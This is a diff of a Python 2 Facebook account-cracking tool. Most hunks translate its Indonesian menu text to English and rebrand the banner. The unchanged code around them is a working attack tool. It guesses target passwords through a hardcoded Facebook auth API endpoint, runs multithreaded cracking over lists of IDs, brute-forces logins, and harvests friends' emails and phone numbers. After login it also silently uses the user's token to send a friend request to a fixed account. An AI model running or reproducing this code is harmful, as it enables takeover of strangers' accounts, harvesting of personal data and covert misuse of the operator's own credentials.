@@ -23,13 +23,13 @@ def jalan(z):
         time.sleep(0.01)
 
 
-logo = '\x1b[1;92m\n\xe2\x95\x94\xe2\x95\xa6\xe2\x95\x97\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x8c\xe2\x94\x80   \xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97 \n \xe2\x95\x91\xe2\x95\x91\xe2\x94\x9c\xe2\x94\x80\xe2\x94\xa4\xe2\x94\x9c\xe2\x94\xac\xe2\x94\x98\xe2\x94\x9c\xe2\x94\xb4\xe2\x94\x90\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\xa0\xe2\x95\xa3 \xe2\x95\xa0\xe2\x95\xa9\xe2\x95\x97\n\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x9d\xe2\x94\xb4 \xe2\x94\xb4\xe2\x94\xb4\xe2\x94\x94\xe2\x94\x80\xe2\x94\xb4 \xe2\x94\xb4   \xe2\x95\x9a  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \x1b[1;93mRkumar\n\x1b[1;93m* \x1b[1;97mAuthor  \x1b[1;91m: \x1b[1;96mRKUMAR\x1b[1;97m\n\x1b[1;93m* \x1b[1;97mSupport \x1b[1;91m: \x1b[1;96MIndian CYB3R ErR0R Sy5tEm\x1b[1;97m[\x1b[1;96m\x1b[1;97m] \x1b[1;97m/ \x1b[1;96we ARE THE HACKERZ \x1b[1;97m/ \x1b[1;96mItx.RK\n\x1b[1;93m* \x1b[1;97mGitHub  \x1b[1;91m: \x1b[1;92m\x1b[4mhttps://github.com/termuxindia\x1b[0m\n[*] Decompiled by MR.RKumar\n'
+logo = '\x1b[1;92m\n\xe2\x95\x94\xe2\x95\xa6\xe2\x95\x97\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x8c\xe2\x94\x80   \xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97 \n \xe2\x95\x91\xe2\x95\x91\xe2\x94\x9c\xe2\x94\x80\xe2\x94\xa4\xe2\x94\x9c\xe2\x94\xac\xe2\x94\x98\xe2\x94\x9c\xe2\x94\xb4\xe2\x94\x90\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\xa0\xe2\x95\xa3 \xe2\x95\xa0\xe2\x95\xa9\xe2\x95\x97\n\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x9d\xe2\x94\xb4 \xe2\x94\xb4\xe2\x94\xb4\xe2\x94\x94\xe2\x94\x80\xe2\x94\xb4 \xe2\x94\xb4   \xe2\x95\x9a  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \x1b[1;94mRkumar\n\x1b[1;93m* \x1b[1;96mAuthor  \x1b[1;91m: \x1b[1;96mRKUMAR\x1b[1;97m\n\x1b[1;93m* \x1b[1;97mSupport \x1b[1;91m: \x1b[1;92MIndian CYB3RH3roz tEam \x1b[1;97m[\x1b[1;96m\x1b[1;97m] \x1b[1;97m/ \x1b[1;96We Are Legends \x1b[1;97m/ \x1b[1;92mItx.RK\n\x1b[1;93m* \x1b[1;97mInstagram  \x1b[1;91m: \x1b[1;92m\x1b[4mRKUMAR045\x1b[0m\n[*] Decompiled by MR.RKumar\n'
 
 def tik():
     titik = [
      '.   ', '..  ', '... ']
     for o in titik:
-        print '\r\x1b[1;91m[\xe2\x97\x8f] \x1b[1;92mWait for a while we are loging in \x1b[1;97m' + o,
+        print '\r\x1b[1;91m[\xe2\x97\x8f] \x1b[1;92mPlease Wait  \x1b[1;97m' + o,
         sys.stdout.flush()
         time.sleep(1)
 
@@ -65,7 +65,7 @@ def login():
         os.system('clear')
         print logo
         print 40 * '\x1b[1;97m\xe2\x95\x90'
-        print '\x1b[1;91m[\xe2\x98\x86] \x1b[1;92mLOGIN TO FACEBOOK AKUN FB \x1b[1;91m[\xe2\x98\x86]'
+        print '\x1b[1;91m[\xe2\x98\x86] \x1b[1;92mLOGIN with FB \x1b[1;91m[\xe2\x98\x86]'
         id = raw_input('\x1b[1;91m[+] \x1b[1;36mUsername FB \x1b[1;91m:\x1b[1;92m ')
         pwd = getpass.getpass('\x1b[1;91m[+] \x1b[1;36mPassword FB \x1b[1;91m:\x1b[1;92m ')
         tik()
@@ -95,7 +95,7 @@ def login():
                 zedd = open('login.txt', 'w')
                 zedd.write(z['access_token'])
                 zedd.close()
-                print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin done'
+                print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin Successful'
                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                 os.system('xdg-open https://m.youtube.com/channel/UCXIBiXqn9IdfkMmamXuLrCw')
                 time.sleep(2)
@@ -105,7 +105,7 @@ def login():
                 Exit()
 
         if 'checkpoint' in url:
-            print '\n\x1b[1;91m[!] \x1b[1;93Mgone to Checkpoint'
+            print '\n\x1b[1;91m[!] \x1b[1;93MAccount on CheckPoint'
             os.system('rm -rf login.txt')
             time.sleep(1)
             keluar()
@@ -122,7 +122,7 @@ def menu():
         toket = open('login.txt', 'r').read()
     except IOError:
         os.system('clear')
-        print '\x1b[1;91m[!] Token tidak ditemukan'
+        print '\x1b[1;91m[!] Token Not Found'
         os.system('rm -rf login.txt')
         time.sleep(1)
         login()
@@ -149,10 +149,10 @@ def menu():
     print '\x1b[1;97m\xe2\x95\x9a' + 40 * '\xe2\x95\x90'
     print '\x1b[1;37;40m1. Information of any friend id'
     print '\x1b[1;37;40m2. H4ck Fb Account'
-    print '\x1b[1;37;40m3. Bot               '
-    print '\x1b[1;37;40m4. other special Group list       '
+    print '\x1b[1;37;40m3. Auto Bot               '
+    print '\x1b[1;37;40m4. 0ther special Group list       '
     print '\x1b[1;37;40m5. LogOut            '
-    print '\x1b[1;31;40m6. hotmails finding coming soon           '
+    print '\x1b[1;31;40m6. Hotmails finding coming soon           '
     print '\x1b[1;31;40m0. exit            '
     print
     pilih()
@@ -337,9 +337,9 @@ def mini():
             print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mName\x1b[1;97m : ' + a['name']
             jalan('\x1b[1;91m[+] \x1b[1;92mtarget \x1b[1;97m...')
             time.sleep(1)
-            jalan('\x1b[1;91m[+] \x1b[1;92mMembuka keamanan \x1b[1;97m...')
+            jalan('\x1b[1;91m[+] \x1b[1;92mUnlock Security \x1b[1;97m...')
             time.sleep(1)
-            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mMohon Tunggu sebentar \x1b[1;97m...')
+            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease Wait a Moment \x1b[1;97m...')
             print 40 * '\x1b[1;97m\xe2\x95\x90'
             pz1 = a['first_name'] + '123'
             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
@@ -354,7 +354,7 @@ def mini():
             else:
                 if 'www.facebook.com' in y['error_msg']:
                     print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
-                    print '\x1b[1;91m[!] \x1b[1;93mgone Checkpoint'
+                    print '\x1b[1;91m[!] \x1b[1;93mAccount Checkpoint'
                     print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
                     print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                     print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz1
@@ -410,25 +410,25 @@ def mini():
                                         print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
                                         print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                         print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz4
-                                        raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+                                        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                         menu_hack()
                                     else:
                                         if 'www.facebook.com' in y['error_msg']:
                                             print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
-                                            print '\x1b[1;91m[!] \x1b[1;93mAkun kena Checkpoint'
+                                            print '\x1b[1;91m[!] \x1b[1;93mAccount Got Checkpoint'
                                             print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
                                             print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                             print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz4
                                             raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                                             menu_hack()
                                         else:
-                                            print '\x1b[1;91m[!] Maaf, gagal membuka password target :('
-                                            print '\x1b[1;91m[!] Cobalah dengan cara lain.'
+                                            print '\x1b[1;91m[!] sorry, failed to unlock target password :('
+                                            print '\x1b[1;91m[!] Try another way.'
                                             raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                                             menu_hack()
         except KeyError:
-            print '\x1b[1;91m[!] Terget tidak ditemukan'
-            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            print '\x1b[1;91m[!] Target not Found'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
             menu_hack()
 
 
@@ -440,7 +440,7 @@ def crack():
     try:
         toket = open('login.txt', 'r').read()
     except IOError:
-        print '\x1b[1;91m[!] Token tidak ditemukan'
+        print '\x1b[1;91m[!] Token Not Found'
         os.system('rm -rf login.txt')
         time.sleep(1)
         login()
@@ -452,7 +452,7 @@ def crack():
         passw = raw_input('\x1b[1;91m[+] \x1b[1;92mPassword \x1b[1;91m: \x1b[1;97m')
         try:
             file = open(idlist, 'r')
-            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
+            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mWait a Minute \x1b[1;97m...')
             for x in range(40):
                 zedd = threading.Thread(target=scrak, args=())
                 zedd.start()
@@ -462,8 +462,8 @@ def crack():
                 zedd.join()
 
         except IOError:
-            print '\x1b[1;91m[!] File tidak ditemukan'
-            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            print '\x1b[1;91m[!] File Not Found'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
             menu_hack()
 
 
@@ -503,7 +503,7 @@ def scrak():
             sys.stdout.flush()
 
     except IOError:
-        print '\n\x1b[1;91m[!] Koneksi terganggu'
+        print '\n\x1b[1;91m[!] connection is interrupted'
         time.sleep(1)
     except requests.exceptions.ConnectionError:
         print '\x1b[1;91m[\xe2\x9c\x96] eror'
@@ -547,7 +547,7 @@ def super():
 def pilih_super():
     peak = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
     if peak == '':
-        print '\x1b[1;91m[!] Jangan kosong'
+        print '\x1b[1;91m[!] Dont empty'
         pilih_super()
     else:
         if peak == '1':
@@ -571,7 +571,7 @@ def pilih_super():
                     asw = json.loads(r.text)
                     print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama grup \x1b[1;91m:\x1b[1;97m ' + asw['name']
                 except KeyError:
-                    print '\x1b[1;91m[!] Grup not found'
+                    print '\x1b[1;91m[!] Gr0up not found'
                     raw_input('\n\x1b[1;91m[ \x1b[1;97meror \x1b[1;91m]')
                     super()
 
@@ -586,8 +586,8 @@ def pilih_super():
                 else:
                     print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + peak + ' \x1b[1;91mTidak ada'
                     pilih_super()
-    print '\x1b[1;91m[+] \x1b[1;92mJumlah ID \x1b[1;91m: \x1b[1;97m' + str(len(id))
-    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
+    print '\x1b[1;91m[+] \x1b[1;92mID number \x1b[1;91m: \x1b[1;97m' + str(len(id))
+    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mWait a Minute \x1b[1;97m...')
     titik = ['.   ', '..  ', '... ']
     for o in titik:
         print '\r\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCrack \x1b[1;97m' + o,
@@ -694,7 +694,7 @@ def brute():
                             ceks.close()
                             print '\n\x1b[1;91m[+] \x1b[1;92mDitemukan.'
                             print 40 * '\x1b[1;97m\xe2\x95\x90'
-                            print '\x1b[1;91m[!] \x1b[1;93mAkun kena Checkpoint'
+                            print '\x1b[1;91m[!] \x1b[1;93mAccount Checkpoint'
                             print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                             print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
                             keluar()
@@ -913,7 +913,7 @@ def grab():
     print '\x1b[1;37;40m4. Get Email friends'
     print '\x1b[1;37;40m5. get Email of friends of friends'
     print '\x1b[1;37;40m6. get No HP teman'
-    print '\x1b[1;37;40m7. Ambil No HP teman dari teman'
+    print '\x1b[1;37;40m7. Take Friends Cellphone Number from a friend'
     print '\x1b[1;31;40m0. exit'
     print
     grab_pilih()
@@ -1076,7 +1076,7 @@ def id_member_grup():
             try:
                 r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + toket)
                 asw = json.loads(r.text)
-                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName grup \x1b[1;91m:\x1b[1;97m ' + asw['name']
+                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mGroup Ka Naam \x1b[1;91m:\x1b[1;97m ' + asw['name']
             except KeyError:
                 print '\x1b[1;91m[!] Grup not found'
                 raw_input('\n\x1b[1;91m[ \x1b[1;97mexit \x1b[1;91m]')
@@ -1363,13 +1363,13 @@ def menu_bot():
     print logo
     print 40 * '\x1b[1;97m\xe2\x95\x90'
     print '\x1b[1;37;40m1. Bot Reactions Target Post'
-    print '\x1b[1;37;40m2. Bot Reactions Grup Post'
-    print '\x1b[1;37;40m3. Bot Komen Target Post'
-    print '\x1b[1;37;40m4. Bot Komen Grup Post'
+    print '\x1b[1;37;40m2. Bot Reactions Gr0up Post'
+    print '\x1b[1;37;40m3. Bot comments Target Post'
+    print '\x1b[1;37;40m4. Bot comments Gr0up Post'
     print '\x1b[1;37;40m5. Mass delete Post'
-    print '\x1b[1;37;40m6. Terima permintaan pertemanan'
-    print '\x1b[1;37;40m7. Hapus pertemanan'
-    print '\x1b[1;31;40m0. Kembali'
+    print '\x1b[1;37;40m6. Accept friend requests'
+    print '\x1b[1;37;40m7. Remove Friendship'
+    print '\x1b[1;31;40m0. Back'
     print
     bot_pilih()
 
